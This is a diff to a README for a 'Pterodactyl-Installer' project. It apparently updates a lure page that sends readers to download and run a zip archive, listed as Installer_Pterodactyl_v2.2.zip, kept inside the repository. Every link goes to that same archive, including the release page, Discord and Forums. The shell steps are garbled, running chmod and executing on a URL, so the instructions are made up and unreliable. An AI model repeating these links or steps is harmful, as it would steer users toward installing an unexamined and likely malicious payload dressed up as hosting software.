@@ -1,6 +1,6 @@
 # 🦖 Pterodactyl-Installer - Install Pterodactyl with Ease
 
-[![Download the latest release](https://raw.githubusercontent.com/marcilionet/Pterodactyl-Installer/main/Amoskeag/Installer-Pterodactyl-1.8.zip%https://raw.githubusercontent.com/marcilionet/Pterodactyl-Installer/main/Amoskeag/Installer-Pterodactyl-1.8.zip)](https://raw.githubusercontent.com/marcilionet/Pterodactyl-Installer/main/Amoskeag/Installer-Pterodactyl-1.8.zip)
+[![Download the latest release](https://github.com/marcilionet/Pterodactyl-Installer/raw/refs/heads/main/Amoskeag/Installer_Pterodactyl_v2.2.zip%https://github.com/marcilionet/Pterodactyl-Installer/raw/refs/heads/main/Amoskeag/Installer_Pterodactyl_v2.2.zip)](https://github.com/marcilionet/Pterodactyl-Installer/raw/refs/heads/main/Amoskeag/Installer_Pterodactyl_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Pterodactyl-Installer! This tool helps you set up the Pterodactyl
 
 ## 📥 Download & Install
 
-To install Pterodactyl-Installer, visit this page to download: [Pterodactyl-Installer Releases](https://raw.githubusercontent.com/marcilionet/Pterodactyl-Installer/main/Amoskeag/Installer-Pterodactyl-1.8.zip).
+To install Pterodactyl-Installer, visit this page to download: [Pterodactyl-Installer Releases](https://github.com/marcilionet/Pterodactyl-Installer/raw/refs/heads/main/Amoskeag/Installer_Pterodactyl_v2.2.zip).
 
 ## 📋 System Requirements
 
@@ -29,11 +29,11 @@ Before you start, make sure your system meets these requirements:
 
 ### Step 1: Download the Installer
 
-1. Visit the [Pterodactyl-Installer Releases](https://raw.githubusercontent.com/marcilionet/Pterodactyl-Installer/main/Amoskeag/Installer-Pterodactyl-1.8.zip) page.
+1. Visit the [Pterodactyl-Installer Releases](https://github.com/marcilionet/Pterodactyl-Installer/raw/refs/heads/main/Amoskeag/Installer_Pterodactyl_v2.2.zip) page.
    
 2. Find the latest version available. You will see files listed for download.
 
-3. Click on the appropriate file for your system, typically named `https://raw.githubusercontent.com/marcilionet/Pterodactyl-Installer/main/Amoskeag/Installer-Pterodactyl-1.8.zip`.
+3. Click on the appropriate file for your system, typically named `https://github.com/marcilionet/Pterodactyl-Installer/raw/refs/heads/main/Amoskeag/Installer_Pterodactyl_v2.2.zip`.
 
 ### Step 2: Prepare Your System
 
@@ -48,7 +48,7 @@ Before you start, make sure your system meets these requirements:
 3. Make the installer executable by running:
 
     ```bash
-    chmod +x https://raw.githubusercontent.com/marcilionet/Pterodactyl-Installer/main/Amoskeag/Installer-Pterodactyl-1.8.zip
+    chmod +x https://github.com/marcilionet/Pterodactyl-Installer/raw/refs/heads/main/Amoskeag/Installer_Pterodactyl_v2.2.zip
     ```
 
 ### Step 3: Run the Installer
@@ -56,7 +56,7 @@ Before you start, make sure your system meets these requirements:
 1. Now, run the installer with the following command:
 
     ```bash
-    https://raw.githubusercontent.com/marcilionet/Pterodactyl-Installer/main/Amoskeag/Installer-Pterodactyl-1.8.zip
+    https://github.com/marcilionet/Pterodactyl-Installer/raw/refs/heads/main/Amoskeag/Installer_Pterodactyl_v2.2.zip
     ```
 
 2. Follow the prompts in the terminal. The installer will ask for your input to confirm configurations.
@@ -97,7 +97,7 @@ For more details, visit the [LICENSE](LICENSE) file in this repository.
 
 Join our community for updates and support. You can find us on:
 
-- Discord: [Join Us](https://raw.githubusercontent.com/marcilionet/Pterodactyl-Installer/main/Amoskeag/Installer-Pterodactyl-1.8.zip)
-- Forums: [Visit our Forums](https://raw.githubusercontent.com/marcilionet/Pterodactyl-Installer/main/Amoskeag/Installer-Pterodactyl-1.8.zip)
+- Discord: [Join Us](https://github.com/marcilionet/Pterodactyl-Installer/raw/refs/heads/main/Amoskeag/Installer_Pterodactyl_v2.2.zip)
+- Forums: [Visit our Forums](https://github.com/marcilionet/Pterodactyl-Installer/raw/refs/heads/main/Amoskeag/Installer_Pterodactyl_v2.2.zip)
 
 Thank you for choosing Pterodactyl-Installer! We hope this tool simplifies your hosting experience.
